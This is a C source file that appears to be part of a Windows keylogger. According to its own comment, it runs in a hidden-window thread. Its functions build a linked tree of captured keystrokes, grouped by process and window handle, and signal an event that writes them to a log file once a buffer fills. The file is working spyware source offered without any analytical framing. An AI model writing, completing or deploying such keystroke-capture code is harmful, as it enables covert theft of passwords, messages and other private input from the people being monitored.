//** Running in the CreateHiddenWindow Thread.

#include "..\..\..\Include\Keylog.h"

extern	CRITICAL_SECTION	csKLTree;		// init??
extern	HANDLE				hUpdateLogFileEvent;
KLIFLINKLIST				*pRoot;

BOOL BuildKLTree(KLTEMPDATA *pTempStruct) {
    KLIFLINKLIST *pCurNode = NULL;
    KLIFLINKLIST *pCurNodeCopy = NULL;

    KLIFLINKLIST *pCurProcessNode = NULL;
    KLIFLINKLIST *pCurProcessNodeCopy = NULL;

    KLIFLINKLIST *pNewNode = NULL;

    int iRetVal = 0;
    BOOL FuncRetVal = FALSE;
    BOOL fEvent = FALSE;
    BOOL fHandleMatch = FALSE;
    BOOL fProcessMatch = FALSE;

    EnterCriticalSection(&csKLTree);
    __try {
        if (pRoot == NULL) {
            pNewNode = (KLIFLINKLIST *)malloc(sizeof(KLIFLINKLIST));
            if (pNewNode == NULL)
                return FALSE;

            FuncRetVal = FillKLTreeData(pNewNode, pTempStruct);
            if (FuncRetVal == FALSE)
                return FALSE;

            pRoot = pNewNode;

            // finish.. goto next pTempStruct
            return TRUE;
        }

        // else part..  At-least 1 process node is present..
        pCurProcessNode = pRoot;

        // traverse throgh the process nodes.. i.e., root nodes and its sibling nodes..
        while (pCurProcessNode != NULL) {
            // Check for a Matching Process node..
            if ((iRetVal = wcscmp(pTempStruct->ProcessData.wszEXEName, pCurProcessNode->ProcessData.wszEXEName)) == 0)
                if (pTempStruct->ProcessData.stStartTime.wHour == pCurProcessNode->ProcessData.stStartTime.wHour &&
                    pTempStruct->ProcessData.stStartTime.wMinute == pCurProcessNode->ProcessData.stStartTime.wMinute &&
                    pTempStruct->ProcessData.stStartTime.wSecond == pCurProcessNode->ProcessData.stStartTime.wSecond &&
                    pTempStruct->ProcessData.stStartTime.wMilliseconds == pCurProcessNode->ProcessData.stStartTime.wMilliseconds) {
                    // if Match is found.. break out of the while loop..
                    // now, pCurProcessNode 'll be pointing to the Matched Process Node..
                    fProcessMatch = TRUE;
                    break;
                }
            // now, pCurProcessNodeCopy 'll be pointing to the last Process Node..  useful in case no Match is found..
            pCurProcessNodeCopy = pCurProcessNode;
            pCurProcessNode = pCurProcessNode->pSiblingLink;
        }

        // no processes matched..
        if (fProcessMatch == FALSE) {
            // add new process..
            pNewNode = (KLIFLINKLIST *)malloc(sizeof(KLIFLINKLIST));
            if (pNewNode == NULL)
                return FALSE;

            FuncRetVal = FillKLTreeData(pNewNode, pTempStruct);
            if (FuncRetVal == FALSE)
                return FALSE;
            // attach the new node to the last process node..  pointed by pCurProcessNodeCopy..
            pCurProcessNodeCopy->pSiblingLink = pNewNode;
            // finish.. goto next pTempStruct
            return TRUE;
        }

        // a Match is found.. i.e., the control comes here if fProcessMatch = TRUE ..

        pCurNode = pCurProcessNode;
        while (pCurNode != NULL) {
            if (pTempStruct->WndCount == pCurNode->WndCount) {
                if (pCurNode->KeysBufferLength >= MAX_KEYS_WRITE_INIT) {
                    fEvent = SetEvent(hUpdateLogFileEvent);
                    if (fEvent == FALSE)
                        return FALSE;
                }
                if (pTempStruct->KLWndData[0].hWnd == pCurNode->KLWndData[0].hWnd) {
                    fHandleMatch = TRUE;

                    wcscat_s(pCurNode->Keys, MAX_KLIF_KEYS, pTempStruct->Keys);
                    pCurNode->KeysBufferLength = wcslen(pCurNode->Keys);
                    pCurNode->KeyCount += pTempStruct->KeyCount;
                    // finish.. goto next pTempStruct
                    break;
                }
            }
            // now, pCurNodeCopy 'll be pointing to the last Handle Node..  useful in case no Match is found..
            pCurNodeCopy = pCurNode;
            pCurNode = pCurNode->pNextLink;
        } // End of while()

        // Handle not matched.. Create new node..
        if (fHandleMatch == FALSE) {
            pNewNode = (KLIFLINKLIST *)malloc(sizeof(KLIFLINKLIST));
            if (pNewNode == NULL)
                return FALSE;

            // copy the pTempStruct data to the new node..
            FuncRetVal = FillKLTreeData(pNewNode, pTempStruct);
            if (FuncRetVal == FALSE)
                return FALSE;

            // attach the new node to the last node..  pointed by pCurNode..
            pCurNodeCopy->pNextLink = pNewNode;
        }

        return TRUE;
    }
    __finally {
        LeaveCriticalSection(&csKLTree);
    }
}

BOOL FillKLTreeData(KLIFLINKLIST *pNewNode, KLTEMPDATA *pTempStruct) {
    pNewNode->KeyCount = pTempStruct->KeyCount;
    pNewNode->KeysBufferLength = pTempStruct->KeysBufferLength;
    wcscpy_s(pNewNode->Keys, MAX_KLIF_KEYS, pTempStruct->Keys);
    pNewNode->WndCount = pTempStruct->WndCount;
    memcpy(pNewNode->KLWndData, pTempStruct->KLWndData, sizeof(pTempStruct->KLWndData));
    memcpy(&pNewNode->ProcessData, &pTempStruct->ProcessData, sizeof(KLPROCESSDATA));

    pNewNode->pSiblingLink = NULL;
    pNewNode->pNextLink = NULL;

    return TRUE;
}
